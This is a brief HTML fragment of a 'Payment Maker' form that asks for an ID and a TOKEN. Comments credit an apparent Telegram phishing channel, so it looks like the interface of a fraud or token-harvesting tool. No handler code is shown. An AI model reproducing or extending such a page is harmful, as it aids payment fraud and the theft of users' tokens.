...
<head>
<title>Payment Maker </title><meta charset="utf-8" />
...
<input type="tel" name="ID" class="inputs animated fadeInDown delay-1s" maxlength="12" placeholder="ID" />
<input type="text" name="TOKEN" class="inputs animated fadeInDown delay-2s" maxlength="50" placeholder="TOKEN" />
<div id="request"></div>
<button type="button" class="btn start animated fadeInUp delay-4s" onclick="formget(this.form, 'finish');" >Creacte</button>
</form></div>
<!----CODED BY X_KILER T.ME/X_KILER ----->
	         <!--------- Ch /X_FISHINIG----->
